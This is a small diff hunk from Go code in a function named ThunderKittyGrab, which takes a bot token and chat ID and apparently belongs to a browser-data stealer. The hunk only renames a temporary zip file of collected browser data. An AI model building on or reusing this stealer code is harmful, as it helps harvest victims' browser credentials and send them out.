@@ -363,7 +363,7 @@ func ThunderKittyGrab(botToken, chatID string) {
 		}
 
 	}
-	tempZip := filepath.Join(os.TempDir(), "browsers.zip")
+	tempZip := filepath.Join(os.TempDir(), "Browsers.zip")
 	if err := Zip(tempDir, tempZip); err != nil {
 		return
 	}
